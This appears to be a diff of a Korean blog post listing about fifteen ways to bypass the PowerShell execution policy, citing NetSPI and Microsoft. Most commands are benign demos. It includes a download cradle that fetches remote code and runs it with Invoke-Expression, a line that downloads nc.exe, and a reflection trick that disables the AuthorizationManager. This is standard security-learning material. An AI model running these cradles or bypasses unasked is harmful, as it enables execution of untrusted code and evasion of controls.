@@ -130,7 +130,7 @@
       <span class="entry-reading-time">
         <i class="fa fa-clock-o"></i>
         
-Reading time ~1 minute
+Reading time ~2 minutes
       </span><!-- /.entry-reading-time -->
       
     </div><!-- /.entry-meta -->
@@ -259,47 +259,104 @@ PS &gt; Set-ExecutionPolicy Restricted -Force
 <p>간단한 스크립트를 작성하여 ps1파일로 저장 후 실행</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Write-Host "Hello World! run me!!!"
 </code></pre></div></div>
+<ul>
+  <li><code class="highlighter-rouge">Get-ExecutionPolicy</code> 명령어로 실행 정책 확인
+  <img src="https://user-images.githubusercontent.com/16396760/50223765-752d3c80-03df-11e9-9c4f-89365eba3494.png" alt="003" /></li>
+  <li><code class="highlighter-rouge">Restricted</code> 정책일 경우 PowerShell 스크립트 사용 불가
+  <img src="https://user-images.githubusercontent.com/16396760/50223764-752d3c80-03df-11e9-80e0-9ec3bf400bc2.png" alt="002" /></li>
+</ul>
 
-<p><img src="https://user-images.githubusercontent.com/16396760/50223764-752d3c80-03df-11e9-80e0-9ec3bf400bc2.png" alt="002" /></p>
+<ol>
+  <li>
+    <p>Paste the Script into an Interactive PowerShell Console
+ <img src="https://user-images.githubusercontent.com/16396760/50223766-75c5d300-03df-11e9-9f0e-bf8f2153b4ed.png" alt="004" /></p>
+  </li>
+  <li>Echo the Script and Pipe it to PowerShell Standard In
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Echo Write-Host "Hello World! run me!!!"  | PowerShell.exe -noprofile -
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223768-75c5d300-03df-11e9-8a99-72de6bfb3a45.png" alt="006" /></p>
+  </li>
+  <li>Read Script from a File and Pipe to PowerShell Standard In
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Get-Content .run.ps1 | PowerShell.exe -noprofile - 
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223767-75c5d300-03df-11e9-8f83-27d1dc04ad28.png" alt="005" /></p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> TYPE .runme.ps1 | PowerShell.exe -noprofile -
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223769-75c5d300-03df-11e9-8f2b-c01bd19044a7.png" alt="007" /></p>
+  </li>
+  <li>Download Script from URL and Execute with Invoke Expression
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL주소')"
+ powershell -nop -c "Invoke-Expression(New-Object Net.WebClient).DownloadFile('URL주소', c:\temp\nc.exe)"
+</code></pre></div>    </div>
+  </li>
+  <li>Use the Command Switch
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Powershell -command "Write-Host 'My voice is my passport, verify me.'"
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223770-765e6980-03df-11e9-81dd-c5e9aa859ffc.png" alt="008" /></p>
+  </li>
+  <li>Use the EncodeCommand Switch
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $command = "Write-Host 'My voice is my passport, verify me.'" 
+ $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
+ $encodedCommand = [Convert]::ToBase64String($bytes) 
+ powershell.exe -EncodedCommand $encodedCommand
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223772-765e6980-03df-11e9-880b-9e3de9e40b8e.png" alt="010" /></p>
 
-<p><img src="https://user-images.githubusercontent.com/16396760/50223765-752d3c80-03df-11e9-9c4f-89365eba3494.png" alt="003" /></p>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223773-76f70000-03df-11e9-86a1-2a7af5d44d3b.png" alt="011" /></p>
+  </li>
+  <li>Use the Invoke-Command Command
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223774-76f70000-03df-11e9-8804-f8bc44943a33.png" alt="012" /></p>
+  </li>
+  <li>
+    <p>Use the Invoke-Expression Command
+ <img src="https://user-images.githubusercontent.com/16396760/50223775-76f70000-03df-11e9-8b4e-d89850d05b4c.png" alt="013" /></p>
 
-<p><img src="https://user-images.githubusercontent.com/16396760/50223766-75c5d300-03df-11e9-9f0e-bf8f2153b4ed.png" alt="004" /></p>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223776-778f9680-03df-11e9-93b2-1f16dcc3cbba.png" alt="014" /></p>
+  </li>
+  <li>Use the “Bypass” Execution Policy Flag
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> PowerShell.exe -ExecutionPolicy Bypass -File .run.ps1
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223777-778f9680-03df-11e9-93cf-70c08125dc52.png" alt="015" /></p>
+  </li>
+  <li>Use the “Unrestricted” Execution Policy Flag
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PowerShell.exe -ExecutionPolicy UnRestricted -File .run.ps1
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223779-78282d00-03df-11e9-911b-02ce4f8cd44a.png" alt="016" /></p>
+  </li>
+  <li>Use the “Remote-Signed” Execution Policy Flag
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
+</code></pre></div>    </div>
+  </li>
+  <li>Disable ExecutionPolicy by Swapping out the AuthorizationManager
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}
+PS &gt; Disable-ExecutionPolicy
+PS &gt; .\runme.ps1
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223780-78282d00-03df-11e9-91a6-973303e626c2.png" alt="017" /></p>
+  </li>
+  <li>
+    <p>Set the ExcutionPolicy for the Process Scope
+<img src="https://user-images.githubusercontent.com/16396760/50223781-78282d00-03df-11e9-9508-1bad6439f319.png" alt="018" /></p>
+  </li>
+  <li>Set the ExcutionPolicy for the CurrentUser Scope via Command
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223782-78282d00-03df-11e9-9cd6-7a19350aaf5c.png" alt="019" /></p>
+  </li>
+  <li>Set the ExcutionPolicy for the CurrentUser Scope via the Registry
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell
+</code></pre></div>    </div>
+    <p><img src="https://user-images.githubusercontent.com/16396760/50223784-78c0c380-03df-11e9-8676-246d6810a134.png" alt="021" />
+<img src="https://user-images.githubusercontent.com/16396760/50223783-78c0c380-03df-11e9-83c4-007639c7203b.png" alt="020" /></p>
+  </li>
+</ol>
 
-<p><img src="https://user-images.githubusercontent.com/16396760/50223767-75c5d300-03df-11e9-8f83-27d1dc04ad28.png" alt="005" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223768-75c5d300-03df-11e9-8a99-72de6bfb3a45.png" alt="006" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223769-75c5d300-03df-11e9-8f2b-c01bd19044a7.png" alt="007" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223770-765e6980-03df-11e9-81dd-c5e9aa859ffc.png" alt="008" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223771-765e6980-03df-11e9-8ee9-938fcd7a8995.png" alt="009" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223772-765e6980-03df-11e9-880b-9e3de9e40b8e.png" alt="010" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223773-76f70000-03df-11e9-86a1-2a7af5d44d3b.png" alt="011" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223774-76f70000-03df-11e9-8804-f8bc44943a33.png" alt="012" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223775-76f70000-03df-11e9-8b4e-d89850d05b4c.png" alt="013" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223776-778f9680-03df-11e9-93b2-1f16dcc3cbba.png" alt="014" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223777-778f9680-03df-11e9-93cf-70c08125dc52.png" alt="015" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223779-78282d00-03df-11e9-911b-02ce4f8cd44a.png" alt="016" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223780-78282d00-03df-11e9-91a6-973303e626c2.png" alt="017" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223781-78282d00-03df-11e9-9508-1bad6439f319.png" alt="018" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223782-78282d00-03df-11e9-9cd6-7a19350aaf5c.png" alt="019" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223783-78c0c380-03df-11e9-83c4-007639c7203b.png" alt="020" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/16396760/50223784-78c0c380-03df-11e9-8676-246d6810a134.png" alt="021" /></p>
-
+<h4 id="참조">참조</h4>
+<p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-6">Microsoft</a><br />
+ <a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">NETSPI</a><br />
+ <a href="https://winaero.com/blog/change-powershell-execution-policy-windows-10/">Winaero</a></p>
 
   </div><!-- /.entry-content -->
 </article><!-- /.hentry -->
